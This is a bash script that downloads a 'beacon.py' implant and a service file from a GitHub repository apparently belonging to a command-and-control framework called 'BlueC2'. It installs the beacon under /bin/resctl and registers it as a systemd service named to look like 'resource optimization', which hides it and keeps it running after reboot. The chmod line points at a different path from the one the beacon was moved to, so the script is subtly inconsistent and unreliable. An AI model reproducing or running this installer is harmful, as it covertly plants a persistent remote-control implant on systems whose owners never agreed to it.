#!/bin/bash

BEACON_URL="https://raw.githubusercontent.com/bcvillano/BlueC2/main/client/beacon.py"
SERVICE_URL="https://raw.githubusercontent.com/bcvillano/BlueC2/main/client/systemd-resourceoptimization.service"

if [[ $EUID -ne 0 ]]; then
    echo "Run this script as root"
    exit 1
fi

#Get scripts for Git repo using curl
curl -o ./beacon.py $BEACON_URL
curl -o ./systemd-resourceoptimization.service $SERVICE_URL


mv ./beacon.py /bin/resctl
mv ./systemd-resourceoptimization.service /etc/systemd/system/systemd-resource-optimization.service

chmod 711 /bin/resource-optimizer

systemctl daemon-reload
systemctl start systemd-resource-optimization.service
systemctl enable systemd-resource-optimization.service